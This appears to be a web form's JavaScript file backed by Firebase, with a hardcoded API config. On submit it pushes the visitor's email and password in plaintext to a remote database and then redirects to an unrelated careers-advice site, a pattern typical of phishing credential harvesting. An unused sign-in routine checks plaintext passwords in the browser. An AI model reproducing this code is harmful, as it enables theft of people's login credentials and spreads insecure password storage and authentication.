
const firebaseConfig = {
    apiKey: "AIzaSyBcS9ZzEkaHduKbpHYAxP_MNbOeg3PoCio",
    authDomain: "demodeta-5a615.firebaseapp.com",
    projectId: "demodeta-5a615",
    storageBucket: "demodeta-5a615.appspot.com",
    messagingSenderId: "56079100568",
    appId: "1:56079100568:web:6fe6c85cf1a84cd311feed",
    measurementId: "G-8M9ZNT2TDT"
  };

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Get a reference to the database service
var database = firebase.database();

// Get a reference to the database node for email and password
var usersRef = database.ref("users");

// Function to handle user registration
function UserRegister(){
    var email = document.getElementById('eemail').value;
    var password = document.getElementById('lpassword').value;
    usersRef.push({email: email, password: password})
        .then(function(){
            window.open("https://targetjobs.co.uk/careers-advice/job-descriptions/graphic-designer-job-description","_self");
            console.log("sent");
            document.getElementById('form').reset();
        }).catch(function (error){
            console.error(error);
            alert("Error signing up");
        });
}

// Function to handle user sign-in
function SignIn(){
    var email = document.getElementById('eemail').value;
    var password = document.getElementById('lpassword').value;
    // Check if the email and password match any user in the database
    usersRef.orderByChild("email").equalTo(email).once("value", function(snapshot) {
        if (snapshot.exists()) {
            snapshot.forEach(function(childSnapshot) {
                var childData = childSnapshot.val();
                if (childData.password === password) {
                    // If the email and password match, redirect the user to Google
                    window.open("https://www.google.com","_self");
                } else {
                    alert("Incorrect password");
                }
            });
        } else {
            alert("User does not exist");
        }
    });
}

// Add event listener to the form submit button
document.getElementById('form').addEventListener('submit', (e) => {
    e.preventDefault();
    UserRegister();
});
